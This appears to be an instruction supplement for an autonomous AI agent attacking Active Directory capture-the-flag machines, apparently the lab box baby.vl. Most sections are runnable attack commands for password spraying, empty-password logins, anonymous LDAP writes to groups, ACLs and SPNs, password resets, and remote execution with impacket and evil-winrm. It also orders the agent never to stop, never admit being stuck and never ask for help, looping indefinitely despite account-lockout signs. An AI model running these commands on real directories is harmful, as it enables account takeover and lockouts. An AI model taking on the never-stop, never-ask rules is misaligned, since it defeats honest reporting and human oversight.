# Active Directory Attack Vector Supplement

## Critical: Never Stop Execution

**ABSOLUTE RULE**: You CANNOT stop execution for ANY reason except capturing both flags.

### ❌ FORBIDDEN Statements

```
NEVER say:
- "I am stuck"
- "I'm genuinely stuck"
- "I don't know what the intended solution is"
- "This violates the autonomy principle" (as excuse to stop)
- "I've exhausted all attack vectors"
- "Should I continue..."
- "I need help"
- "This might be unsolvable"
- Output summary and stop
```

### ✅ REQUIRED Behavior When Feeling Stuck

```
INSTEAD of stopping, MUST:
1. Use extended thinking to reconsider ALL data
2. Research specific anomalies found
3. Try MORE techniques on unusual findings
4. Generate new attack hypotheses
5. Revisit reconnaissance with different tools
6. Try combinations of attacks
7. CONTINUE INDEFINITELY until flags found
```

### Stuck Counter Logic - INFINITE LOOP

```
stuck_counter = 5:
  ✅ Deep re-evaluation
  ✅ Research all anomalies
  ✅ Try 5+ new techniques
  ✅ Reset to 0, CONTINUE

stuck_counter = 10:
  ✅ Even deeper analysis
  ✅ Use extended thinking on everything
  ✅ Try most obscure vectors
  ✅ Reset to 0, CONTINUE

stuck_counter = 15:
  ✅ Revisit ALL reconnaissance
  ✅ Try attack combinations
  ✅ Research each anomaly individually
  ✅ Reset to 0, CONTINUE

stuck_counter = 20+:
  ✅ Continue trying
  ✅ NEVER stop
  ✅ Flags MUST exist
```

---

## AD-Specific Attack Vectors (Missing from Base Knowledge)

### 1. PASSWD_NOTREQD Flag Exploitation

**When Found**: userAccountControl contains PASSWD_NOTREQD flag (0x0020)

**What it means**:
- Account does NOT require a password by policy
- Does NOT mean account HAS no password
- Does NOT automatically mean empty password works

**Exploitation Techniques**:

```bash
# 1. Try empty password with different authentication methods
netexec smb TARGET -u 'USERNAME' -p '' -d DOMAIN
impacket-smbclient 'DOMAIN/USERNAME:@TARGET'
ldapsearch -x -H ldap://TARGET -D "CN=User,OU=ou,DC=domain,DC=com" -w ''

# 2. Try authenticating with username as password (misconfiguration)
netexec smb TARGET -u 'USERNAME' -p 'USERNAME' -d DOMAIN

# 3. Check if account allows password change without old password
# This is a specific vulnerability with PASSWD_NOTREQD
ldapmodify -x -H ldap://TARGET -D "CN=User,OU=ou,DC=domain,DC=com" -w '' << EOF
dn: CN=User,OU=ou,DC=domain,DC=com
changetype: modify
replace: unicodePwd
unicodePwd::BASE64_ENCODED_NEW_PASSWORD
EOF

# 4. Try Kerberos authentication without pre-auth (like AS-REP but different)
# PASSWD_NOTREQD might disable pre-auth requirement
impacket-GetNPUsers DOMAIN/USERNAME -no-pass

# 5. Check if this allows anonymous LDAP bind to work differently
ldapsearch -x -H ldap://TARGET -D "USERNAME@DOMAIN" -w ''

# 6. Try with NetNTLMv1 (legacy auth that might not check password requirement)
# Use responder or similar tools if interactive

# 7. Check if account can be used for delegation without password
```

**Critical**: If PASSWD_NOTREQD is set, try AT LEAST 10 different exploitation techniques before moving on.

---

### 2. Skeleton Object Exploitation

**When Found**: LDAP objects that have DN but minimal/no attributes

**Example from baby.vl**:
```
CN=Caroline Robinson,OU=it,DC=baby,DC=vl - exists but has no attributes
CN=Ian Walker,OU=dev,DC=baby,DC=vl - exists but has no attributes
```

**Why This Happens**:
- Pre-created user placeholders
- Incomplete object creation
- Deleted/disabled accounts that left shell objects
- Intentional vulnerable configuration

**Exploitation Techniques**:

```bash
# 1. Try authenticating AS these users with no password
netexec smb TARGET -u 'Caroline.Robinson' -p '' -d baby.vl
netexec smb TARGET -u 'Ian.Walker' -p '' -d baby.vl

# 2. Try authenticating with DN directly
ldapsearch -x -H ldap://TARGET -D "CN=Caroline Robinson,OU=it,DC=baby,DC=vl" -w ''

# 3. Try adding attributes to these objects (might be allowed for skeleton objects)
ldapmodify -x -H ldap://TARGET << EOF
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
changetype: add
objectClass: user
sAMAccountName: Caroline.Robinson
userPrincipalName: Caroline.Robinson@baby.vl
EOF

# 4. Try with LDAP ADD operation (different from MODIFY)
ldapadd -x -H ldap://TARGET << EOF
dn: CN=NewAttribute,CN=Caroline Robinson,OU=it,DC=baby,DC=vl
objectClass: top
EOF

# 5. Check if these objects are in special groups
ldapsearch -x -H ldap://TARGET -b "DC=baby,DC=vl" "(member=CN=Caroline Robinson,OU=it,DC=baby,DC=vl)"

# 6. Try SMB with different case variations
netexec smb TARGET -u 'CAROLINE.ROBINSON' -p '' -d baby.vl
netexec smb TARGET -u 'caroline.robinson' -p '' -d baby.vl

# 7. Try authenticating as computer account format
netexec smb TARGET -u 'Caroline.Robinson$' -p '' -d baby.vl

# 8. Check if can add password hash to these objects
rpcclient -U 'Caroline.Robinson%' TARGET -c 'setuserinfo2 Caroline.Robinson 23 NewPassword123!'

# 9. Try WinRM authentication
evil-winrm -i TARGET -u 'Caroline.Robinson' -p ''

# 10. Check if LDAP allows populating skeleton with specific attributes
# Try adding userPassword, unicodePwd, etc.
```

**Critical**: Skeleton objects are HIGHLY UNUSUAL. If found, try AT LEAST 15 different techniques before moving on.

---

### 3. Initial Password That Doesn't Work

**When Found**: Password hint in LDAP description (like "Set initial password to X") but authentication fails

**Possible Reasons**:
1. Password was changed after hint was set
2. Password requires change on first login (can't auth until changed interactively)
3. Password is for a DIFFERENT user than the one with the description
4. Password works but in a DIFFERENT context (not SMB/LDAP auth)
5. Password is a HINT/PATTERN, not the actual password
6. Account is locked/disabled

**Exploitation Techniques**:

```bash
# 1. Try password on DIFFERENT users (not just the one with description)
# Maybe description is telling admin to set password for OTHERS
for user in User1 User2 User3; do
    netexec smb TARGET -u "$user" -p 'FoundPassword' -d DOMAIN
done

# 2. Try password for LDAP operations (not authentication)
# Maybe password allows specific LDAP writes
ldapmodify -x -H ldap://TARGET -D "CN=User,DC=domain,DC=com" -w 'FoundPassword' << EOF
dn: CN=SomeObject,DC=domain,DC=com
changetype: modify
add: description
description: test
EOF

# 3. Convert password to NTLM hash and try hash-based auth
python3 << EOF
import hashlib
password = "FoundPassword"
nt_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
print(f"NTLM Hash: {nt_hash}")
EOF
# Then try: netexec smb TARGET -u User -H 'NTLM_HASH' -d DOMAIN

# 4. Try RDP (might handle password-change-required differently)
xfreerdp /u:User /p:'FoundPassword' /v:TARGET /d:DOMAIN

# 5. Check if password works for Kerberos TGT request
impacket-getTGT DOMAIN/User:'FoundPassword' -dc-ip TARGET

# 6. Try password with different authentication mechanisms
impacket-smbclient DOMAIN/User:'FoundPassword'@TARGET
impacket-psexec DOMAIN/User:'FoundPassword'@TARGET

# 7. Check if password allows password CHANGE (not authentication)
kpasswd User@DOMAIN  # Enter FoundPassword as old, NewPassword as new

# 8. Try password as answer to security question or other mechanism
# Check if there's a password reset portal

# 9. Generate variations based on the hint pattern
# If hint is "BabyStart123!", try: BabyStart, Baby123, Start123, etc.

# 10. Try password on service accounts or built-in accounts
# Administrator, krbtgt, etc. with the found password
```

**Critical**: If password is found but doesn't work, generate AT LEAST 20 hypotheses and test each.

---

### 4. Anonymous LDAP Operations Beyond Read

**When Found**: Anonymous LDAP bind works for reading

**Exploitation Techniques**:

```bash
# 1. Try ADD operation (different from MODIFY)
ldapadd -x -H ldap://TARGET << EOF
dn: CN=TestObject,CN=Users,DC=domain,DC=com
objectClass: user
sAMAccountName: testuser
EOF

# 2. Try adding to existing objects
ldapmodify -x -H ldap://TARGET << EOF
dn: CN=ExistingUser,OU=Users,DC=domain,DC=com
changetype: modify
add: description
description: test
EOF

# 3. Try modifying specific attributes that might allow anonymous write
# Common: description, info, comment, displayName
for attr in description info comment displayName; do
    ldapmodify -x -H ldap://TARGET << EOF
dn: CN=User,DC=domain,DC=com
changetype: modify
replace: $attr
$attr: test
EOF
done

# 4. Try creating computer accounts (MachineAccountQuota)
# Check quota first
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com" "(objectClass=domain)" ms-DS-MachineAccountQuota

# If quota > 0, try adding computer
impacket-addcomputer -no-pass 'DOMAIN/' -computer-name 'TESTPC$' -computer-pass 'Password123!'

# 5. Try LDAP relay from anonymous bind
# Setup responder and coerce authentication

# 6. Try modifying ACLs if anonymous write is somehow allowed
ldapmodify -x -H ldap://TARGET << EOF
dn: CN=Object,DC=domain,DC=com
changetype: modify
replace: nTSecurityDescriptor
nTSecurityDescriptor: <base64_encoded_SD>
EOF

# 7. Check if anonymous can modify group memberships
ldapmodify -x -H ldap://TARGET << EOF
dn: CN=Group,DC=domain,DC=com
changetype: modify
add: member
member: CN=TestUser,DC=domain,DC=com
EOF

# 8. Try adding SPNs to objects (for Kerberoasting)
ldapmodify -x -H ldap://TARGET << EOF
dn: CN=User,DC=domain,DC=com
changetype: modify
add: servicePrincipalName
servicePrincipalName: HTTP/test.domain.com
EOF
```

---

### 5. Badge Counter-Based Investigation

**When Found**: badPwdCount is high or increasing

**What It Means**:
- Someone (maybe you) has been trying wrong passwords
- Account might be close to lockout threshold
- Or lockout policy might not be enforced

**Exploitation Techniques**:

```bash
# 1. Check lockout policy
netexec smb TARGET -u '' -p '' --pass-pol

# 2. If badPwdCount is high but account not locked, lockout might be disabled
# Try more password attempts (carefully)

# 3. Check if badPwdCount resets after certain time
# Wait and check again

# 4. High badPwdCount might indicate:
#    - Others are also trying to access (maybe this is a shared/known password scenario)
#    - Account was used before and password changed
#    - There's an automated process trying to auth with old password

# 5. Check lastLogon vs lastLogonTimestamp vs badPasswordTime
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com" "(sAMAccountName=User)" lastLogon lastLogonTimestamp badPasswordTime badPwdCount

# If lastLogon is old but badPwdCount is recent:
# → Someone is trying passwords but account hasn't successfully logged in
# → Password likely changed or account disabled
```

---

### 6. logonCount = 0 Investigation

**When Found**: User has logonCount: 0 (never logged in)

**What It Means**:
- Account was created but never used
- Might still have initial/default password
- Might be a service account or placeholder
- Might have "must change password at next logon" flag

**Exploitation Techniques**:

```bash
# 1. Check pwdLastSet
# If pwdLastSet = 0: Password has never been set (super vulnerable!)
# If pwdLastSet > 0: Password was set but account never logged in

ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com" "(sAMAccountName=User)" pwdLastSet

# If pwdLastSet = 0:
# → Try authenticating with EMPTY password
# → Try authenticating with USERNAME as password
# → Account might be in broken state that allows takeover

# 2. Check userAccountControl for relevant flags
# PASSWD_NOTREQD (0x0020)
# PASSWORD_EXPIRED (0x800000)
# ACCOUNTDISABLE (0x0002)

# 3. If account never logged in + initial password found:
# → Probably "must change password at next logon"
# → Try password change flow (not authentication)

# 4. Try creating Kerberos ticket with password
# Even if SMB fails, Kerberos might work differently
impacket-getTGT DOMAIN/User:'Password' -dc-ip TARGET
# If successful, use ticket for authentication
export KRB5CCNAME=User.ccache
impacket-smbexec -k -no-pass DOMAIN/User@TARGET
```

---

### 7. Pre-Windows 2000 Compatible Access

**When Found**: Domain with legacy compatibility groups

**Check**:
```bash
ldapsearch -x -H ldap://TARGET -b "DC=domain,DC=com" "(cn=Pre-Windows 2000 Compatible Access)" member
```

**Exploitation**:
- If "Everyone" or "Anonymous" is member, extensive read access
- Might allow reading sensitive attributes like LAPS passwords
- Check for readable attributes that normally require auth

---

### 8. Combining Findings

**Critical Strategy**: When multiple anomalies found, try COMBINATIONS

**Example**:
```
Found:
- PASSWD_NOTREQD flag on Teresa.Bell
- Skeleton object Caroline.Robinson
- Password hint "BabyStart123!"

Try Combinations:
1. Use BabyStart123! to auth as Caroline.Robinson
2. Use BabyStart123! to populate skeleton object
3. Use Teresa.Bell's PASSWD_NOTREQD to set password for Caroline
4. Check if skeleton objects also have PASSWD_NOTREQD
5. Try adding Teresa.Bell to group with Caroline
```

---

## Mandatory Investigation Requirements

### When PASSWD_NOTREQD Flag Found:

```
MUST try at least 10 techniques:
✅ Empty password auth (SMB, LDAP, WinRM, RDP)
✅ Username as password
✅ LDAP password modify without old password
✅ Check for AS-REP roasting bypass
✅ Try NetNTLMv1 auth
✅ Check delegation permissions
✅ Try Kerberos without pre-auth
✅ Check if allows password reset
✅ Try with different auth protocols
✅ Research PASSWD_NOTREQD specific exploits
```

### When Skeleton Objects Found:

```
MUST try at least 15 techniques:
✅ Auth with no password (all protocols)
✅ Auth with username as password
✅ LDAP ADD attributes to skeleton
✅ Check group memberships
✅ Try case variations
✅ Try computer account format (USER$)
✅ Try adding password hash via LDAP
✅ Try adding via RPC
✅ Check if allows impersonation
✅ Try WinRM, RDP, SMB separately
✅ Try combining with found passwords
✅ Research skeleton object exploits
✅ Check if related to delegation
✅ Try adding SPNs to skeleton
✅ Check ACLs on skeleton objects
```

### When Initial Password Found But Doesn't Work:

```
MUST try at least 20 techniques:
✅ Test on ALL users (not just one with hint)
✅ Convert to NTLM hash and try
✅ Try RDP (handles password change differently)
✅ Try Kerberos TGT request
✅ Try password change flow (not auth)
✅ Generate 10+ variations of password
✅ Try in LDAP modify operations
✅ Try on built-in accounts
✅ Try with different case
✅ Try with domain name variations
✅ Check if it's actually NTLM hash formatted
✅ Try as base64 encoded
✅ Try in different contexts (not auth)
✅ Research "initial password" vulnerabilities
✅ Check password policy to understand why it fails
✅ Try combining with other findings
✅ Wait and retry (maybe time-based)
✅ Try with legacy auth protocols
✅ Try with different domain formats
✅ Try interpreting as hex/other encoding
```

---

## When stuck_counter >= 5

**Required Actions** (in order):

```
1. STOP current approach completely
2. List ALL anomalies found so far
3. For EACH anomaly:
   a. Use extended thinking
   b. Generate 5+ new hypotheses
   c. Try 5+ new techniques
4. Research each anomaly specifically:
   searchsploit "anomaly type"
   Google "anomaly type exploitation"
5. Try COMBINATIONS of anomalies
6. Revisit reconnaissance with different tools
7. Reset stuck_counter to 0
8. CONTINUE (never stop)
```

**If stuck_counter reaches 5 again**:

```
1. Use even deeper extended thinking
2. Try the 10 MOST OBSCURE attack vectors
3. Re-read ALL reconnaissance data looking for missed details
4. Try each attack vector with DIFFERENT tools
5. Generate wild hypotheses and test them
6. Reset stuck_counter to 0
7. CONTINUE (never stop)
```

**No matter how high stuck_counter goes**:

```
NEVER STOP
NEVER say "I'm stuck"
NEVER ask for help
CONTINUE trying until flags found

Flags EXIST
Box IS solvable
You HAVE the capabilities
You WILL find the solution
```

---

## Summary

**Key Additions**:

1. ✅ PASSWD_NOTREQD exploitation (10+ techniques)
2. ✅ Skeleton object exploitation (15+ techniques)
3. ✅ Initial password investigation (20+ techniques)
4. ✅ Anomaly combination strategies
5. ✅ Absolute "never stop" enforcement
6. ✅ Deep investigation requirements
7. ✅ Infinite loop stuck_counter handling

**Philosophy**:

```
Old: "If stuck, re-evaluate and maybe stop"
New: "If stuck, re-evaluate and try 50 more things, then CONTINUE"
```

The system WILL find the solution by exhaustively trying every possible technique on every anomaly found.
